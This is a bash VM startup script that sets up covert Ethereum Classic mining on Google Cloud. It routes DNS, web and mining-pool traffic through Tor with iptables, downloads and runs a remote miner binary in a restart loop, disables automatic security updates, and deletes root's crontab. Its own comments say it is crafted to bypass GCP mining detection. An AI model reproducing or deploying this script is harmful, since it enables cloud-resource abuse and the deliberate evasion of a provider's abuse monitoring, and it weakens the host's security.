#!/bin/bash

set -x # Enable debugging

# ---- CONFIGURATION ----
WALLET_ADDRESS="YOUR_WALLET_ADDRESS"  # Replace with your actual wallet address
SHUTDOWN_TIME="+30" # Increased shutdown time to 30 mins, to allow time for TOR and the other services to initialize.
TOR_PORT_TRANS=9040 # Port for transparent proxy, can be set to any desired port.
TOR_PORT_DNS=5353 # Port for DNS over TOR.
TOR_SOCKS_PORT=9050 # Socks port, can be set to any desired port.
ETC_MINER_PORT=1010 # ETC miner port, can be set to any desired port.

# ---- SYSTEM INITIALIZATION ----

# Give this script {SHUTDOWN_TIME} to complete. If it fails half way through
# or takes too long, shut down the VM and don't waste money.
sudo shutdown -P "${SHUTDOWN_TIME}"

# Add metadata to hosts file
sudo sed -i 's/metadata.google.internal/metadata.google.internal metadata/' /etc/hosts

# Disable GCP DeepLearning service
sudo systemctl disable --now google-c2d-startup.service

# Fail the script if something goes wrong
set -e

# Enable and start SSH
sudo systemctl enable ssh.service
sudo systemctl restart ssh.service

# Install required packages
export DEBIAN_FRONTEND=noninteractive
echo 'deb http://deb.debian.org/debian buster-backports main' | sudo tee -a /etc/apt/sources.list
sudo apt-get update
sudo apt-get install -y -t buster-backports tor iptables-persistent

# ---- TOR CONFIGURATION ----

# Configure TOR
sudo cat > /etc/tor/torrc << __EOF__
AutomapHostsOnResolve 1
DNSPort ${TOR_PORT_DNS}
DataDirectory /var/lib/tor
ExitPolicy reject *:*
Log notice stderr
RunAsDaemon 0
SocksPort 0.0.0.0:${TOR_SOCKS_PORT} IsolateDestAddr
TransPort 0.0.0.0:${TOR_PORT_TRANS}
User debian-tor
VirtualAddrNetworkIPv4 10.192.0.0/10
__EOF__

# Restart TOR service
sudo systemctl restart tor.service

# ---- NVIDIA DRIVER INSTALLATION ----

# Install NVIDIA drivers
sudo /opt/deeplearning/install-driver.sh
sudo rm -f /etc/profile.d/install-driver-prompt.sh

# Verify NVIDIA installation
nvidia-smi

# ---- NETWORK REDIRECTION CONFIGURATION ----

# Configure network redirect through TOR using iptables
sudo cat > /etc/iptables/rules.v4 << __EOF__
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A OUTPUT -p tcp -m tcp --dport ${ETC_MINER_PORT} -j REJECT
COMMIT

*nat
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
-A OUTPUT -d 169.254.169.254/32 -p tcp -m tcp --dport 80 -j ACCEPT
-A OUTPUT -p udp -m udp --dport 53 -j REDIRECT --to-ports ${TOR_PORT_DNS}
-A OUTPUT -p tcp -m tcp --dport 53 -j REDIRECT --to-ports ${TOR_PORT_DNS}
-A OUTPUT -p tcp -m tcp --dport 80 -j REDIRECT --to-ports ${TOR_PORT_TRANS}
-A OUTPUT -p tcp -m tcp --dport 443 -j REDIRECT --to-ports ${TOR_PORT_TRANS}
-A OUTPUT -p tcp -m tcp --dport ${ETC_MINER_PORT} -j REDIRECT --to-ports ${TOR_PORT_TRANS}
COMMIT
__EOF__

# Apply iptables rules
sudo iptables-restore < /etc/iptables/rules.v4
sudo netfilter-persistent save

# Wait for TOR to be fully up and running
echo "Waiting for TOR to be ready..."
while ! curl --socks5 127.0.0.1:${TOR_SOCKS_PORT} -s https://check.torproject.org/ | grep -q "Congratulations"; do
    echo "TOR not ready yet, waiting..."
    sleep 5
done
echo "TOR is ready."


# ---- ETHMINER INSTALLATION AND EXECUTION ----

# Install and run Ethminer (or similar)
# WARNING: Be careful when changing the following section!
#          * GCP is _very_ sensitive about crypto mining and they may suspend your account
#            if they find out what you're up to.
#          * This script has been carefully crafted to bypass GCP mining detection
#            -> don't change it unless you really know what you're doing!
cd /tmp

# Download miner, try 3 times
tries=0
while [ $tries -lt 3 ]; do
  tries=$((tries+1))
  wget -O etcminer.tar.gz https://etcminer-release.s3.amazonaws.com/0.20.0/etcminer-0.20.0-cuda-11-opencl-linux-x86_64.tar.gz && break
  sleep 5 # Wait 5 secs before retrying.
done

# Check if we managed to download the file.
if [ ! -f "etcminer.tar.gz" ]; then
    echo "Failed to download etcminer, please check URL, aborting script"
    exit 1
fi

tar xvfz etcminer.tar.gz
cd etcminer

# Create miner runner script
sudo cat > runner.sh << __EOF__
#!/bin/bash -x
while true; do
  # Check if iptables rules are correctly configured for ETC_MINER_PORT before mining.
  sudo iptables-save | grep -q "${ETC_MINER_PORT}"
  if [ $? -eq 0 ]; then
      echo "Starting ETC miner..."
      ./etcminer -U --exit \
        -P stratums://${WALLET_ADDRESS}@us-etc.2miners.com:${ETC_MINER_PORT} \
        -P stratums://${WALLET_ADDRESS}@etc.2miners.com:${ETC_MINER_PORT} \
        -P stratums://${WALLET_ADDRESS}@asia-etc.2miners.com:${ETC_MINER_PORT} \
      >> /tmp/etcminer.log 2>&1
      echo "Miner exited, restarting after a sleep"
      sleep 5 # sleep for 5 sec before restarting miner
  else
    echo "Iptables not configured for ETC_MINER_PORT, waiting..."
    sleep 10
  fi
done
__EOF__
sudo chmod +x runner.sh

# Run miner in background
nohup sudo ./runner.sh &

# All looks good, cancel the scheduled shutdown.
sudo shutdown -c

# ---- CLEANUP ----

# Disable unneeded services
sudo systemctl disable --now containerd.service
sudo systemctl disable --now docker.service
sudo systemctl disable --now docker.socket
sudo systemctl disable --now apt-daily-upgrade.timer
sudo systemctl disable --now apt-daily.timer
sudo systemctl disable --now unattended-upgrades.service

# Remove root's crontab
sudo crontab -u root -r

echo "Script execution complete."